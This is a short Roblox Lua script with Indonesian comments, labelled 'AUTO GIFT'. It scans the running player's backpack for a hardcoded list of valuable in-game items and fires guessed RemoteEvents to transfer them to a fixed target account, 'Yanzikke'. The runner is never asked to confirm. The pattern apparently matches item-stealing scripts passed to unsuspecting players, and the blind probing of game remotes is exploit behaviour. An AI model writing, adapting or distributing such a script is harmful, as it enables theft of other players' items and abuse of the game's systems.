--=== CONFIG ===--
local targetName = "Yanzikke" -- Ganti dengan nama target
local valuableItems = {
    "Candy Blossom", "DragonFly", "Racoon", "Cactus",
    "Durian", "Chicken Zombie", "Blood Hedgehog"
}

--=== AUTO GIFT ===--
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")

local targetPlayer = Players:FindFirstChild(targetName)
if not targetPlayer then
    warn("Target tidak ditemukan")
    return
end

-- Coba cari RemoteEvent umum
local remoteCandidates = {
    "GiftItem", "SendItem", "GiveTool", "TradeItem", "RemoteEvent"
}

local function tryGift(remoteName, item)
    local remote = ReplicatedStorage:FindFirstChild(remoteName)
    if remote and remote:IsA("RemoteEvent") then
        print("Mencoba Remote:", remoteName, "->", item.Name)
        pcall(function()
            remote:FireServer(targetPlayer, item)
        end)
    end
end

for _, tool in ipairs(Backpack:GetChildren()) do
    if table.find(valuableItems, tool.Name) then
        for _, remoteName in ipairs(remoteCandidates) do
            tryGift(remoteName, tool)
        end
        task.wait(0.5)
    end
end